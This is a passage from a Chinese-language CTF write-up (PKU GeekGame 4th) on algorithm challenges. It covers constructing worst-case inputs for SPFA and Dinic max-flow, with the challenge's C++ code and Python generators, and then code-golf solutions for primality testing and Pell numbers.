                    v.append(Edge(ids[i][j], ids[i + 1][j + 1], random.randint(10, SIZE + 10)))
            if j < m:
                v.append(Edge(ids[i][j], ids[i][j + 1], random.randint(10, SIZE + 10)))
                v.append(Edge(ids[i][j + 1], ids[i][j], random.randint(10, SIZE + 10)))

    print(f"Number of nodes: {tp}, Number of edges: {len(v)}")

    random.shuffle(v)
    with open("spfa_input.txt", "w") as f:
        f.write(f"{tp} {len(v)} 1 {tp}\n")
        for edge in v:
            f.write(f"{a[edge.u]} {a[edge.v]} {edge.w}\n")


if __name__ == "__main__":
    main()
```

### Dinic并非万能

{% note primary simple %}

Dinic 算法是在网络流计算最大流的强多项式复杂度的算法。

类似于复杂度为 O(|V||E|^2)的 Edmonds–Karp 算法，Dinic 算法的复杂度为 O(|V|^2|E|)

但是在大多数网络建模下，Dinic 的速度远优于其最坏复杂度。

请尝试让 Dinic 达到其理论最坏复杂度 (使代码中的计数器超过 1e6)。

{% endnote %}

{% hideToggle Dinic's algorithm %}

```cpp
// Dinic's algorithm

#include <assert.h>
#include <iostream>

#include <list>
#include <queue>
#include <vector>

using namespace std;

const int MAXN = 100;
const int MAXM = 5000;
const int MAXW = 1e9;

struct edge {
    int to, cap;
    edge *rev;
};
list<edge> E[MAXN + 1];
long long ops = 0;

int dfs(int u, int t, int limit, vector<int> &dis) {
    if (u == t || !limit)
        return limit;
    int res = limit;
    for (edge &e : E[u]) {
        int v = e.to, w = e.cap;
        ops++;
        if (w && dis[v] == dis[u] + 1) {
            int flow = dfs(v, t, min(res, w), dis);
            e.cap -= flow;
            e.rev->cap += flow;
            res -= flow;
        }
    }
    if (res == limit)
        dis[u] = MAXW + 1;
    return limit - res;
}

void dinic(int n, int m, int s, int t) {
    int flow = 0;
    while (true) {
        vector<int> dis(n + 1, MAXW + 1);
        queue<int> q;

        dis[s] = 0;
        q.push(s);
        while (!q.empty()) {
            int u = q.front();
            q.pop();
            for (edge e : E[u]) {
                int v = e.to, w = e.cap;
                ops++;
                if (w && dis[v] > dis[u] + 1) {
                    dis[v] = dis[u] + 1;
                    q.push(v);
                }
            }
        }
        if (dis[t] == MAXW + 1)
            break;
        flow += dfs(s, t, MAXW + 1, dis);
    }

    cout << flow << endl;
}

int main(int argc, char *argv[]) {
    int n, m, s, t;
    cin >> n >> m >> s >> t;
    assert(1 <= n && n <= MAXN);
    assert(1 <= m && m <= MAXM);
    assert(1 <= s && s <= n);
    assert(1 <= t && t <= n);

    long long sum = 0;
    for (int i = 0; i < m; i++) {
        int u, v, c;
        cin >> u >> v >> c;
        sum += c;
        assert(1 <= u && u <= n);
        assert(1 <= v && v <= n);
        assert(1 <= c && c <= MAXW);
        assert(1 <= sum && sum <= MAXW);
        assert(u != v);

        edge e1 = {v, c, nullptr};
        edge e2 = {u, 0, nullptr};
        E[u].push_back(e1);
        E[v].push_back(e2);
        E[u].back().rev = &E[v].back();
        E[v].back().rev = &E[u].back();
    }

    dinic(n, m, s, t);

    cerr << ops << endl;
}
```

{% endhideToggle %}

关于如何卡Dinic算法，我找到的信息不多，在洛谷上找到了一些[相关讨论](https://www.luogu.com/discuss/723695?page=1)，然而：

![image-20241019194205100](https://blogfiles.oss.fyz666.xyz/png/35bcf350-7436-4c01-955d-2625fa05d41f.png)

蚌！

Google搜“dinic algorithm worst case”，搜到一篇[论文](https://www.sciencedirect.com/science/article/pii/089396599190145L)。文中给了一组种构造方法：

<img src="https://blogfiles.oss.fyz666.xyz/png/871a8adc-65b0-4ccc-b57d-a8e54cda47a0.png" alt="image-20241019194449639" style="zoom:50%;" />

论文提出在这种n顶点、2n-3条边的情形下，Dinic算法达到最坏的时间复杂度。

考虑到这题的n限制在100，如果构造这个图，数量级似乎是够的，火速写好代码生成数据：

```python
class Edge:
    def __init__(self, u, v, w):
        self.u = u
        self.v = v
        self.w = w


def main():
    N = 100
    v = []
    for i in range(1, N - 1):
        v.append(Edge(i, i + 1, N))
        v.append(Edge(i, N, 1))

    v.append(Edge(N - 1, N, 1))

    with open("dinic_input.txt", "w") as f:
        f.write(f"{N} {len(v)} 1 {N}\n")
        for edge in v:
            f.write(f"{edge.u} {edge.v} {edge.w}\n")

main()
```

然而在本地测试了一下，发现`ops`仅仅只有6万多，远远不够flag2要求的100万。

阅读题目代码，发现代码中边数的上限为5000，而这种构造只构造了197条边，好像有点浪费了。注意到5000差不多是100个点构成的完全图的边数，因此我猜测要让几乎每两个点之间都连一条。那么剩下的边怎么加才能发挥最大价值呢？我启发式地想到让每个顶点都有一条回到前面顶点的路线，且这条路要正好把手上的流量用完，代码如下：

```python
class Edge:
    def __init__(self, u, v, w):
        self.u = u
        self.v = v
        self.w = w


def main():
    N = 100
    v = []
    for i in range(1, N - 1):
        v.append(Edge(i, i + 1, N))
        v.append(Edge(i, N, 1))

    v.append(Edge(N - 1, N, 1))

    for i in range(1, N - 1):
        for j in range(i + 1, N):
            if len(v) < 5000:
                v.append(Edge(j, i, N - j + 1))
    with open("dinic_input.txt", "w") as f:
        f.write(f"{N} {len(v)} 1 {N}\n")
        for edge in v:
            f.write(f"{edge.u} {edge.v} {edge.w}\n")

main()
```

试了一下，居然奏效了，`ops`达到了190万多，成功拿到flag2！

## 神秘计算器

{% hideToggle 查看题面 %}
{% note primary simple %}

欢迎使用神秘计算器 Python 版。本计算器支持**四则运算和乘方**，还提供了自定义函数功能。

但是作为试用版计算器，本计算器有如下限制：

- 只支持输入整数
- 函数定义只支持小于 50 个字符

你能用这个计算器做什么呢？

1. 试试实现一个函数，判断给定的数**是不是素数。**
2. 试试实现一个函数，计算**第 n 个 [Pell 数](https://www.baidu.com/s?word=pell数&rsv_dl=DQA_PC_COPY)。**如果你只能算对前几个 Pell 数，你可以拿到部分分数。

注：此题是 Algorithm 题，无需绕过沙箱执行其他代码或获取系统权限。

[本题源码](https://github.com/PKU-GeekGame/geekgame-4th/raw/refs/heads/master/official_writeup/algo-codegolf/attachment/algo-codegolf.py)

{% endnote %}

{% endhideToggle %}

### 素数判断函数

要用非常基本的运算符实现一个素性检验函数，那么费马素性检验就非常适合这个场景。

费马素性检验利用到了费马小定理：

如果正整数$a$不是素数$p$的倍数，就有
$$
a^{p-1} \equiv1\pmod p
$$
那么我们生成一个大素数$a$，就能检出2-500间的所有素数，但问题是会有一些合数也被错误检成素数，即伪素数。但这里我们只需要判断500以内的数即可，故可以不停的随机大素数来找满足条件的$a$。

[解题代码](https://gist.github.com/windshadow233/93d134740424f80540366dc987d9dd3f)

### Pell数（一）

查了一下佩尔数，发现是一个类似于斐波那契数列的递推数列。咦这不是有通项公式吗？

![image-20241019204047430](https://blogfiles.oss.fyz666.xyz/png/8071fea0-281d-445f-8318-aa789509881c.png)

这佩尔数岂不是送分？

试了一下发现并没有那么简单，因为Python的浮点数精度不够，算到后面就和真实值渐行渐远了。

不过前40项精度还是勉强够的，只要适当取整即可。这里考虑到表达式的长度限制，可以把通项公式分子的第二项直接去掉（因为太小了，几乎不影响结果），然后通过 (Pn+0.6) // 1的操作来对结果取整：

```raw
((1+2**(1/2))**(n-1)/2**(3/2)+3/5)//1
```

### Pell数（二）

第二题就没法用前面的通项公式做了，因为这题直接要求进行整数计算，并且需要计算200项。看了第二阶段的提示才想起来还有生成函数这么个东西，由于提示给的[链接](https://blog.paulhankin.net/fibonacci/)已经把构造方法说的很清楚了，这里不再写具体过程。二阶段限制调整到了100字符，于是我也没有做优化，下面是一个答案：

```raw
2**(4*n*n-4*n)//(2**(8*n-8)-2**(4*n-3)-1)%(2**(4*n-4))
```
